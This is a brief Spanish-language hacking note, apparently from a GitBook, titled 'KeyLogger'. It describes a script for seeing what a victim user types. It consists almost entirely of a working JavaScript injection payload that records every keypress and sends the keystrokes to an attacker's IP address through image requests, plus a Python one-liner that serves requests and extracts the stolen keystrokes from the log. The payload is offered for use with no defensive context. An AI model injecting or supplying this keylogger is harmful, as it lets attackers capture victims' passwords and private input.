# KeyLogger

Script en js para ver que está tecleando el usuario victima

```
python3 -m http.server 80 2>&1 | grep -oP 'GET /\K[^.*\s]+'
```

```
<script>
        var k = "";
        document.onkeypress = function(e){
                e = e || window.event;
                k += e.key;
                var i = new Image();
                i.src = "http://192.168.1.173/" + k;
        };
</script>
```

<div align="left"><figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt="" width="487"><figcaption></figcaption></figure></div>
